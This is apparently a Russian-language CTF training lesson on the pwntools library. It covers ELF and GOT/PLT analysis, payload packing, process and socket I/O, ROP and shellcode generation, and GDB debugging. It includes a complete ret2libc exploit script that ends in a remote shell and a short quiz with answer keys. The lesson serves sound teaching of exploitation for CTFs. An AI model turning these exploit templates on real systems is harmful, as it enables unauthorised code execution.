---
id: pwn-pwntools
title: "pwntools: рабочий инструмент pwn-специалиста"
category: pwn
parent: pwn-elf-basics
difficulty: easy
order: 2
tags: [pwntools, tooling, elf, rop, remote, gdb]
prerequisites: [pwn-elf-basics]
useful_for:
  - "CTF Pwn категория"
  - "Автоматизация эксплуатации"
  - "Разработка эксплойтов"
estimated_minutes: 50
summary: "Осваиваем pwntools: ELF/ROP-анализ, упаковка данных, взаимодействие с локальным и удалённым процессом, отладка через GDB."
---
pwntools — де-факто стандартная библиотека Python для разработки эксплойтов. Она закрывает весь цикл: разбор ELF и его защит, поиск гаджетов, упаковку чисел в little-endian, синхронизацию с процессом или удалённым сокетом, подключение отладчика, генерацию shellcode и символическое исполнение. Без неё решение pwn-задач превращается в ручную возню с `struct.pack` и `socket.recv`. Владение pwntools ускоряет работу в разы и делает эксплойт воспроизводимым.

## Что такое pwntools и зачем он нужен

pwntools — это набор модулей: `pwnlib.elf`, `pwnlib.rop`, `pwnlib.asm`, `pwnlib.shellcraft`, `pwnlib.tubes`, `pwnlib.gdb`, `pwnlib.fmtstr`, `pwnlib.util.packing`. Каждый модуль решает одну задачу и импортируется одной строкой `from pwn import *`. Ключевая ценность — единый API для локального процесса и удалённого сокета: `process('./chall')` и `remote('host', 1337)` возвращают объекты с одинаковыми методами `send`, `recvuntil`, `sendlineafter`. Это значит, что эксплойт, отлаженный локально, запускается на удалённой цели сменой одной функции `start()`.

Типичный рабочий цикл pwn-специалиста: определить митигации (`checksec`), найти смещение до RIP (`cyclic`), собрать цепочку (`ROP`), утечь адрес libc, пересчитать базу, добить `system('/bin/sh')`. pwntools предоставляет готовые примитивы для каждого шага, поэтому важно не просто знать имена функций, а понимать, что каждая из них делает под капотом — иначе на нестандартной цели вы не поймёте, почему `flat` собрал payload не так.

## Установка, контекст и базовый каркас

```bash
python3 -m pip install --user pwntools
python3 -c "from pwn import *; print(version)"
```

Версия важна: старые релизы не знают новых архитектур и не умеют работать с `checksec` для некоторых митигаций. Обновляйтесь через `pip install -U pwntools`. Для отладки нужен `gdb` с `pwndbg` или `gef`; для кросс-архитектурного запуска — `qemu-user`.

```python
from pwn import *
context.binary = elf = ELF('./chall')   # задаёт arch/os/endian из ELF
context.arch = 'amd64'                   # 'i386','aarch64','mips','arm'
context.os = 'linux'
context.endian = 'little'
context.log_level = 'info'               # 'debug' для полного трейса
context.terminal = ['tmux', 'splitw', '-h']  # как открывать gdb.attach

def start():
    if args.LOCAL:
        return process('./chall')
    return remote('host', 1337)

p = start()
```

`context.binary` — самый важный вызов: он автоматически выставляет `context.arch`, `context.os`, `context.endian`, а также привязывает объект ELF, поэтому `asm`, `shellcraft`, `ROP` и упаковка работают без ручной настройки. Если забыть `context.binary`, `asm('nop')` не поймёт, для какой архитектуры ассемблировать. `args.LOCAL` — магия pwntools: наличие флага `LOCAL` в командной строке (`./exp.py LOCAL`) включает локальный режим; аналогично `args.REMOTE`, `args.GDB`, `args.DEBUG`.

## ELF-анализ: символы, GOT/PLT, checksec

```python
elf = ELF('./chall')
elf.checksec()                     # NX, PIE, canary, RELRO, FORTIFY
hex(elf.symbols['win'])            # адрес символа
elf.plt['puts']                    # адрес заглушки PLT
elf.got['puts']                    # адрес записи GOT
elf.bss()                          # начало .bss
elf.address                        # база (0, пока не задана)
elf.symbols['main']
elf.search(b'/bin/sh\x00')         # генератор адресов строки
next(elf.search(b'/bin/sh\x00'))
elf.libc                           # ELF libc, если удалось определить
```

`elf.checksec()` печатает сводку: `Arch`, `RELRO` (`Full`/`Partial`/`No`), `Stack`, `NX`, `PIE`, `RWX`, `Canary`, `FORTIFY`. Это первое, что смотрят при анализе. `ELF('./chall', checksec=False)` создаётся быстрее — используйте в цикле, когда checksec не нужен.

Важное различие: `elf.plt['puts']` — адрес вызова (`puts@plt`), а `elf.got['puts']` — адрес ячейки, в которой лежит реальный адрес libc-функции. Утечка GOT (`puts@got`) позволяет вычислить базу libc: `libc.address = leak - libc.symbols['puts']`.

```python
libc = ELF('./libc.so.6', checksec=False)
libc.symbols['system']
next(libc.search(b'/bin/sh'))
libc.address = 0x7ffff7dc0000      # после утечки
hex(libc.symbols['system'])        # теперь абсолютный адрес
```

## Упаковка и распаковка данных

```python
p32(0xdeadbeef)              # b'\xef\xbe\xad\xde'
p64(0x4011a6)                # b'\xa6\x11@\x00\x00\x00\x00\x00'
u32(b'\xef\xbe\xad\xde')     # 0xdeadbeef
u64(leak.ljust(8, b'\x00'))  # дополнение нулями обязательно
flat({0x40: b'A'*8, 0x48: p64(win)})
flat({0: b'AAAA', 8: p64(1)}, length=0x50, filler=b'\x90')
```

`u64` требует ровно 8 байт; `recvline()` возвращает строку без `\n`, длина которой может быть меньше 8 — поэтому `ljust(8, b'\x00')` обязателен, иначе `u64` бросит исключение или вернёт мусор. `flat` — рабочая лошадка сборки payload: он принимает словарь `{offset: data}`, сортирует по смещению, заполняет промежутки `filler` и возвращает единый `bytes`. Это избавляет от ручных `b'A'*offset + p64(...)`, где легко ошибиться на единицу.

## Взаимодействие с процессом и сокетом

```python
p.recv(n)                      # ровно n байт (или меньше при EOF)
p.recvline()                   # до \n включительно
p.recvn(8)                     # гарантированно 8 байт
p.recvuntil(b'> ')             # до разделителя
p.recvregex(rb'0x[0-9a-f]+')   # регуляркой
p.recvrepeat(1)                # всё, что придёт за 1 секунду
p.send(b'data')
p.sendline(b'cmd')
p.sendafter(b'> ', b'cmd')
p.sendlineafter(b'> ', b'cmd')
p.clean(1)
p.interactive()
```

`recvuntil` и `sendlineafter` — главные инструменты синхронизации: они ждут конкретный разделитель, поэтому эксплойт не зависит от таймингов. `p.recvrepeat(timeout)` выгребает весь буфер, полезен для диагностики. `p.interactive()` передаёт stdin/stdout пользователю — после получения shell.

## ROP и shellcode

```python
rop = ROP(elf)
rop.call('system', [next(elf.search(b'/bin/sh'))])
rop.chain()                                  # bytes цепочки
rop.find_gadget(['pop rdi', 'ret']).address  # поиск гаджета
rop.rdi, rop.rsi, rop.rdx                     # готовые pop-гаджеты
rop.ret.address                               # ret для выравнивания
```

```python
context.arch = 'amd64'
asm('xor rax, rax; inc rax; syscall')        # ручной shellcode
asm(shellcraft.sh())                          # готовый execve /bin/sh
asm(shellcraft.cat('/flag'))                  # open/read/write /flag
shellcraft.amd64.linux.sh()
```

`ROP(elf)` строит объект из гаджетов, найденных в бинаре; `rop.call('system', [arg])` автоматически подбирает цепочку `pop rdi; ret` перед вызовом. `rop.chain()` возвращает финальные байты. Для архитектур без libc используйте `shellcraft` — шаблоны `sh()`, `execve()`, `open()`, `read()`, `write()` для десятков архитектур.

## Отладка: gdb.attach, gdb.debug, corefile

```python
p = gdb.debug('./chall', gdbscript='''
b *vuln+40
c
''')
gdb.attach(p, gdbscript='b *main+50\nc')
```

`gdb.debug` запускает процесс под отладчиком с самого начала, `gdb.attach` подключается к уже запущенному. `context.terminal` определяет, в каком окне откроется GDB. Для «слепых» падений полезно `p.corefile` — pwntools сохраняет core и позволяет исследовать регистры после краха. Ещё удобна связка с `cyclic`: при падении `RIP` равен `0x616161...`, и `cyclic_find(0x6161616161616161)` даёт точное смещение до перезаписи возврата.

## Разобранный пример ret2libc end-to-end

Пусть есть 64-битный бинарь с NX, без PIE, без canary, с PLT/GOT `puts` и `main`. Цель — выполнить `system('/bin/sh')`.

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6', checksec=False)

def start():
    return process('./chall') if args.LOCAL else remote('host', 1337)

OFFSET = 40   # найдено через cyclic_find(0x6161616c)

def exploit():
    p = start()
    # Шаг 1: утечка puts@got и возврат в main
    rop = ROP(elf)
    rop.call(elf.plt['puts'], [elf.got['puts']])
    rop.call(elf.symbols['main'])
    p.sendlineafter(b'> ', flat({OFFSET: rop.chain()}))
    leak = u64(p.recvline().strip().ljust(8, b'\x00'))
    libc.address = leak - libc.symbols['puts']
    log.success(f'libc base = {hex(libc.address)}')

    # Шаг 2: system('/bin/sh')
    rop2 = ROP(libc)
    rop2.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
    p.sendlineafter(b'> ', flat({OFFSET: rop2.chain()}))
    p.interactive()

if __name__ == '__main__':
    exploit()
```

Ожидаемый вывод при `LOCAL`:

```
[*] '/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] libc base = 0x7ffff7dc0000
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user)
```

Порядок критичен: сначала `puts@plt` вызывается с аргументом `puts@got`, печатает 8 байт реального адреса, затем возврат в `main` даёт второй раунд для финального payload. Без возврата в `main` процесс завершится после утечки.

## Полезные приёмы и модули

- `log.info/success/warning/error` — структурированный цветной вывод вместо `print`.
- `SigreturnFrame()` — готовый фрейм для SROP.
- `Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])` — автоматизация ret2dlresolve.
- `fmtstr_payload(offset, {addr: value}, write_size='short')` — генерация format-string записи.
- `p.libs()` — словарь загруженных библиотек процесса.
- `process(['qemu-aarch64', '-L', '/usr/aarch64-linux-gnu', './bin'])` — запуск под qemu-user.
- `remote('host', 443, ssl=True)` — TLS-соединение.
- `ELF.patch_custom_libraries('./chall', './libc.so.6')` — заставить бинарь грузить нужный libc через patchelf.
- `p.canary` — авто-утечка canary через `__stack_chk_fail`, если функция читает/пишет до него.

## Частые ошибки и подводные камни

- **Забыли `context.binary`.** `asm`/`ROP`/`flat` не знают архитектуру и молча собирают мусор.
- **Неверный оффсет.** Найдён на «почти том же» бинаре или посчитан вручную. Всегда `cyclic_find`.
- **Путаница GOT/PLT.** `puts@plt` — вызов, `puts@got` — указатель. Утечка через `puts@plt(puts@got)`.
- **Не сбросили базу libc.** Обращение к `libc.symbols[...]` до `libc.address = ...` даёт смещение, а не адрес.
- **Строка короче 8 байт.** `u64` без `ljust` падает или врёт.
- **Зависание без таймаута.** `recvline()` на молчащей цели ждёт вечно — добавляйте `timeout=`.
- **`ret` для выравнивания.** На amd64 `system` требует 16-байтового выравнивания стека; лишний `ret` перед вызовом лечит `movaps`-креш.
- **Локальный libc ≠ удалённый.** Патчите бинарь нужным libc или считайте оффсеты по слитой версии.

## Справочные таблицы

| Функция | Назначение |
|---|---|
| `ELF(path)` | разбор ELF: symbols, plt, got, bss, search |
| `ROP(elf)` | конструктор цепочек, `call`, `find_gadget` |
| `flat({off: data})` | сборка payload по смещениям |
| `p64/p32/u64/u32` | упаковка/распаковка LE |
| `cyclic(n)` / `cyclic_find(v)` | паттерн и поиск смещения |
| `asm(src)` / `shellcraft.*` | ассемблер и шаблоны shellcode |
| `process/remote` | локальная и удалённая труба |
| `gdb.attach/debug` | отладка |
| `fmtstr_payload` | генератор format-string |
| `SigreturnFrame` | SROP-фрейм |

| Метод трубы | Семантика |
|---|---|
| `recvuntil(d)` | до разделителя включительно |
| `sendlineafter(d, x)` | ждать `d`, послать `x\n` |
| `recvrepeat(t)` | всё за `t` секунд |
| `interactive()` | отдать управление пользователю |

## Что дальше / решение

Следующие шаги: освоить `ROP`-гаджеты (`pwn-gadget-hunting`), научиться утечке libc (`pwn-ret2libc`), затем перейти к heap (`pwn-heap-basics`) и kernel (`pwn-kernel-intro`). Практический совет: держите под рукой единый шаблон эксплойта из раздела выше — он переиспользуется в большинстве задач; меняется только тело `exploit()`. Автоматизируйте всё, что повторяется: утечки, пересчёт базы, поиск гаджетов. Чем меньше ручной работы, тем меньше ошибок на нестандартных целях.

## Квиз

```quiz
- question: "Что делает context.binary?"
  options:
    - "Задаёт бинарь/архитектуру для asm, ROP и упаковки"
    - "Собирает бинарь"
    - "Запускает отладчик"
    - "Сканирует порты"
  answer: 0
  explanation: "context.binary настраивает архитектуру и привязывает ELF."
- question: "Как распаковать 8-байтовую утечку?"
  options:
    - "u64(leak.ljust(8, b'\\x00'))"
    - "p64(leak)"
    - "hex(leak)"
    - "int(leak)"
  answer: 0
  explanation: "u64 распаковывает little-endian 8 байт (с дополнением нулями)."
- question: "Как удобно собрать payload с оффсетами?"
  options:
    - "flat({offset: p64(addr)})"
    - "p64(addr)"
    - "cyclic()"
    - "send()"
  answer: 0
  explanation: "flat собирает словарь оффсет->данные в один payload."
- question: "Как найти смещение до RIP по значению?"
  options:
    - "cyclic_find(value)"
    - "u64(value)"
    - "ELF(value)"
    - "rop.find_gadget(value)"
  answer: 0
  explanation: "cyclic_find возвращает позицию паттерна, соответствующего значению."
- question: "Что делает gdb.attach(p)?"
  options:
    - "Подключает отладчик к процессу для анализа"
    - "Запускает shellcode"
    - "Собирает бинарь"
    - "Сканирует память"
  answer: 0
  explanation: "gdb.attach подключает GDB к живому процессу с заданным скриптом."
```

## Где пригодится

- **CTF:** Pwn — стандартный инструмент.
- **Bug bounty:** автоматизация эксплуатации.
- **Пентест:** разработка эксплойтов.
- **Работа:** exploit development.
